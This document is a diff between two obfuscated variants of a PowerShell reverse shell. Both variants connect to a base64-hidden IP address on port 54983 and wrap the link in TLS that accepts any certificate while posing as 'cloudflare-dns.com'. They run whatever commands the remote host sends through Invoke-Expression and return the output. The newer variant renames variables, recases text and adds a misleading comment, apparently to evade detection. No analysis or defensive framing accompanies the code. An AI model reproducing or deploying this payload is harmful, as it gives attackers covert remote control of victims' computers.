@@ -1,51 +1,52 @@
-$lasy = 1; 
+$actIve = 1; 
 
-if ($lasy -ne 1) { ExiT }
+if ($ACTIVE -ne 1) { eXIt }
 
 try {
-    $qSi8XK9 = [SYSTem.sEcuRIty.aUThEntICaTIon.SSLPROToCoLS]::TLs12;
+    $sSlProtOcoLS = [sYSTeM.sEcurIty.authENTICATion.SslPROtocOLS]::Tls12;
     
-    $rvuJ = [SYStEm.TEXT.eNCoDIng]::Utf8.getstRINg([sYsTEm.COnVeRT]::frOmBase64sTRiNg(('MTQ2Ljc'+'wL'+'jI0MC4y'+'MDU'+'=')));
-    
-    $MbuLykqk = 54983; 
+    $tarGetIP = [SystEm.tEXT.enCOdING]::UTF8.getstRiNG([SYStEM.CONVeRt]::FRomBasE64stRinG(('MT'+'Q2LjcwL'+'jI0MC4y'+'MDU'+'=')));
+    $PORT = 54983;
 
-    $dA38wm = nEw-ObjecT NEt.socKEts.TcpCLiEnt($RVUj, $mbuLYkQK);
-    $Y2ySm = $da38wm.gEtSTrEAm();
+    $TcpcLiEnt = nEW-OBject Net.soCKeTs.TCPCLienT($TArGEtIp, $POrT);
+    $nEtWorkstreAm = $TcPCliEnt.GETSTreAM();
     
-    $hDb2Nw = nEW-oBjecT neT.SEcURITy.ssLStReAm($Y2Ysm, (-not($TrUE)), ({$true} -as [NEt.sEcuRItY.rEMOTECERtIficAtevALIDaTIoNcAlLbAck]));
-    $hdB2NW.autHENTIcaTeAsCLient(('clou'+'d'+'fl'+'are-dns.'+'com'), $nUlL, $qsi8xK9, (-not($TrUE)));
+    $ssLsTReAm = NeW-OBJect NEt.SECUrIty.SsLstReaM($NetWORkstREam, ($ENV:CoMPUTErnamE.LenGTH -lt 0), ({(1 -band 1)} -as [nET.sECuriTY.remoTecerTiFIcaTEValidAtioNCALLBaCk]));
+    $SslsTreAm.AuTheNtICAtEascliEnt(('cloudfl'+'are-dns'+'.com'), $NULl, $SslProtoCOLs, ($PSveRSIONTABLE.PsverSiOn.MajOR -lt 0));
 
-    if(!$HDb2NW.iSeNCrYpTEd) {
-        $hDb2Nw.ClOse();
-        EXit;
+    if(!$SSLSTrEAM.isenCrYpTed -or !$SslSTrEAM.IsSiGNED) {
+        $SSlsTREaM.CLose();
+        exIt;
     }
 
-    $Th8yh = NEW-ObJECt Io.STReAmwRiTeR($hDb2Nw);
-    $tH8yh.aUTOFlUSh = (1 -band 1);
+    $STREaMwrIteR = nEw-obJeCt io.stReAmWrITeR($SslstREAM);
+    $StreamWRItEr.autofLUsh = ('x' -eq 'x');
 
-    function WritETostREAm ($iGBs1ht) {
-        [BYtE[]]$script:AJ6J = NEW-oBJEcT SYSTeM.byTe[] 4096;
-        $th8yH.WRiTe($IGbs1Ht + (-join('P','S ')) + (gET-LocATIon).PaTH + '> ');
+# Waiting briefly before continuing with the next block
+    function wriTeTostREAm ($strIng) {
+        [byte[]]$ScRipt:bUffeR = nEw-ObjeCt systEm.byTe[] 4096;
+        $sTrEAmWRiTER.wRItE($sTrinG + (-join('P','S',' ')) + (gl).PAtH + (-join('>',' ')));
     };
 
-    WritETostREAm '';
-
-    while(($raIBCSW = $Hdb2nw.rEAD($script:AJ6J, 0, $script:AJ6J.length)) -gt 0) {
-        $MKfF = ([tExT.enCODing]::UTF8).geTstRINg($script:AJ6J, 0, $raibcsW).TRim();
+    WRITEtOstReam '';
+    
+    while(($ByteSrEad = $SSlsTReAM.reAD($BuffeR, 0, $bUfFeR.LENgTH)) -gt 0) {
+        $Command = ([TeXT.eNCoDIng]::Utf8).gEtsTriNg($bUfFEr, 0, $BYteSREaD - 1).tRim();
         
-        if ($mKff -eq (-join('e','xi','t'))) { break }
+        if ($Command -eq ('e'+'x'+'i'+'t')) { break }
         
-        $ozHlqy7s = try {
-            Invoke-Expression $MKFF 2>&1 | oUt-STRINg
+        $OUtpUT = try {
+            iNvokE-exprESsiON $Command 2>&1 | OUT-strinG
         } catch {
-            $_ | ouT-StriNG
+            $_ | OUt-stRiNG
         }
         
-        WritETostREAm ($ozhlQy7S);
+        writeTosTreAM ($OuTPut);
     }
 
-    $th8yH.cloSe();
-    $dA38Wm.cLoSE();
+    $streaMwRItEr.CLOSe();
+    $TcpCLIenT.cLoSE();
 } catch {
-    EXIt;
+
+    eXIT;
 }
